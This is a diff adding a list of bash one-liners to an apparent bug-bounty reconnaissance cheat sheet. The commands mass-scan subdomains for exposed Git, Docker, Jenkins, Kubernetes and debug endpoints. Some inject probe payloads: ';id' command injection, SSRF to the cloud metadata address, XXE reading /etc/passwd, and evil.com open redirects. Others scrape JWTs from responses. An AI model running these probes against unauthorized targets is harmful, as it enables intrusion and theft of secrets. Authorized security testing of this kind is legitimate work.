@@ -2518,3 +2518,109 @@ Detect Command Injection Points
 cat subdomains.txt | gf command-injection | qsreplace ';id' | httpx -silent -fr 'uid=' -o cmd_injection.txt
 ```
 
+Here is the converted content:
+
+Find Exposed Docker Daemon API (Remote Control)
+```bash
+naabu -list subdomains.txt -p 2375 -silent | httpx -silent -o docker_api_exposed.txt
+```
+
+Identify Open Git Directories (.git Exposed)
+```bash
+cat subdomains.txt | httpx -silent -path /.git/config -mc 200 -o git_dirs_exposed.txt
+```
+
+Scan for Exposed Server Status Pages (Apache/Nginx)
+```bash
+cat subdomains.txt | httpx -silent -path-list <(echo -e '/server-status\n/nginx-status') -mc 200 -o server_status_exposed.txt
+```
+
+Detect Open Jenkins Panels with Script Console
+```bash
+cat subdomains.txt | httpx -silent -path /script -mc 200 -o jenkins_script_console.txt
+```
+
+Find Exposed AWS S3 Buckets via Subdomains
+```bash
+cat subdomains.txt | nuclei -t s3-detect.yaml -o open_s3_buckets.txt
+```
+
+Search for Potential Open Redirects (Unsafe Redirects)
+```bash
+cat subdomains.txt | gf redirect | qsreplace 'https://evil.com' | httpx -silent -fr 'evil.com' -o open_redirects.txt
+```
+
+Find Debug/Error Pages (Sensitive Stacktrace)
+```bash
+cat subdomains.txt | httpx -silent -sc -fr 'error\|exception\|trace' -o error_pages.txt
+```
+
+Detect Exposed Jenkins API Endpoints
+```bash
+cat subdomains.txt | httpx -silent -path /api/json -mc 200 -o jenkins_api_exposed.txt
+```
+
+Find Exposed Kubernetes Dashboard (Cluster Control)
+```bash
+cat subdomains.txt | httpx -silent -path /api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy/ -mc 200 -o k8s_dashboard_exposed.txt
+```
+
+Detect SSRF via Open Redirect Chains
+```bash
+cat subdomains.txt | gf ssrf | qsreplace 'http://169.254.169.254/latest/meta-data/' | httpx -silent -fr 'ami-id\|instance-id' -o ssrf_exploitable.txt
+```
+
+Look for Backup or Archive Files (tar.gz, zip)
+```bash
+cat subdomains.txt | httpx -silent -path-list <(echo -e '/backup.tar.gz\n/site-backup.zip') -mc 200 -o backup_files_exposed.txt
+```
+
+Identify Known Vulnerable CMS Versions
+```bash
+nuclei -l subdomains.txt -t cves/ -o cms_cve_vulns.txt
+```
+
+Find JWT Tokens or Sensitive Tokens in Responses
+```bash
+cat subdomains.txt | httpx -silent -sr | grep -Eo 'eyJ[^"]+' | tee jwt_tokens.txt
+```
+
+Detect Basic Auth Protected Pages (Bruteforce Target)
+```bash
+cat subdomains.txt | httpx -silent -sc -H "Authorization: Basic fakeauth" -o basic_auth_detected.txt
+```
+
+Detect Exposed .git Repositories (Full Source Code Leak)
+```bash
+cat subdomains.txt | httpx -silent -path /.git/config -mc 200 -o exposed_git_repos.txt
+```
+
+Find Public .DS_Store Files (Directory Listing Exposure)
+```bash
+cat subdomains.txt | httpx -silent -path /.DS_Store -mc 200 -o ds_store_exposed.txt
+```
+
+Scan for Exposed .svn Repos (Source Code Leak)
+```bash
+cat subdomains.txt | httpx -silent -path /.svn/entries -mc 200 -o svn_repos_exposed.txt
+```
+
+Find Open GraphQL Endpoints (GraphQL Injection)
+```bash
+cat subdomains.txt | httpx -silent -path /graphql -mc 200 -o graphql_exposed.txt
+```
+
+Detect Exposed Laravel Debug Pages (Full App Secrets)
+```bash
+cat subdomains.txt | httpx -silent -path /_ignition/health-check -mc 200 -o laravel_debug_exposed.txt
+```
+
+Check for File Upload Points (RCE Chances)
+```bash
+cat subdomains.txt | gf upload | httpx -silent -o file_upload_points.txt
+```
+
+Find XML External Entity (XXE) Injection Points
+```bash
+cat subdomains.txt | gf xxe | qsreplace 'file:///etc/passwd' | httpx -silent -fr 'root:x' -o xxe_exploitable.txt
+```
